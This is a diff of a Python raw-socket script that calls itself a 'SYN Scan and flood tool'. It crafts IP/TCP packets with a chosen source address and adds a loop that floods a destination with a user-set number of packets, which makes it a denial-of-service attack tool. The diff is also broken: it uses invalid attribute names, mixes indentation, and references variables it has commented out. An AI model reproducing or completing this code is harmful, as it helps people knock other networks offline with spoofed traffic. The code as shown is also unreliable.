@@ -4,7 +4,8 @@
 import socket
 import sys
 from struct import *
-
+# argparser to take arguments correctly
+import argparse
 # Global list to store the error messages
 error_msg = []
 
@@ -111,20 +112,40 @@ def tcpCreate(source_ip ,dest_ip, source_port, dest_port):
 def main():
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 	createSock(s)
-	usage()
-	source_ip = (str(sys.argv[1]))
-	dest_ip = (str(sys.argv[2]))
-	source_port = (int(sys.argv[3]))
-	dest_port = (int(sys.argv[4]))
-	ip_header = ipCreate(source_ip, dest_ip)
-	tcp_header = tcpCreate(source_ip, dest_ip, source_port, dest_port)
+#	usage()
+#	source_ip = (str(sys.argv[1]))
+#	dest_ip = (str(sys.argv[2]))
+##	source_port = (int(sys.argv[3]))
+#	dest_port = (int(sys.argv[4]))
+	parser = argparse.ArgumentParser(description='SYN Scan and flood tool')
+        parser.add_argument("-s", "--source-ip", help='Source IP Address to form packet', type=str, required=True)
+        parser.add_argument("-d", "--dest-ip", help='Destination IP address to form packet', type=str, required=True)
+
+        args = parser.parse_args()
+	ip_header = ipCreate(args.source-ip, args.dest-ip)
+	#ip_header = ipCreate(source_ip, dest_ip)
+	#tcp_header = tcpCreate(source_ip, dest_ip, source_port, dest_port)
 	packet = ip_header + tcp_header
 	# Attempt to check if data has actually been sent - s.sendto(packet, ('source_ip' << THIS DETERMINES SUCCESS), 0 ))
-	result = s.sendto(packet, (dest_ip, 0))
+#	result = s.sendto(packet, (dest_ip, 0))
 
-	# Add a dynamic loop which will take input of some sort and produce a syn flood effect
-	for i < num
+	# Include optional argument
+	choice = raw_input("Would you like to cause a flood of packets? ")
+	decision = str(choice)
+	if(choice == 'y'):
+		i = 0
+		counter = raw_input("Enter the number of packets to flood with: ")
+		value = int(counter)
+		while i < value:
+			i += 1
+			print ('Your number is {}'.format(i))
+			result = s.sendto(packet, (dest_ip, 0))
+	elif(choice == 'n'):
+		print ('Sending one packet then')
+		result = s.sendto(packet, (dest_ip, 0))
+	else:
+		print ("I didn't catch that")
+		sys.exit(1)
 	print ('Packet size is {}'.format(result))
 	# TO TEST THIS PROGRAM LAUNCH IN PYTHON AND OPEN WIRESHARK ON THE SPECIFIED NETWORK INTERFACE
-
 main()
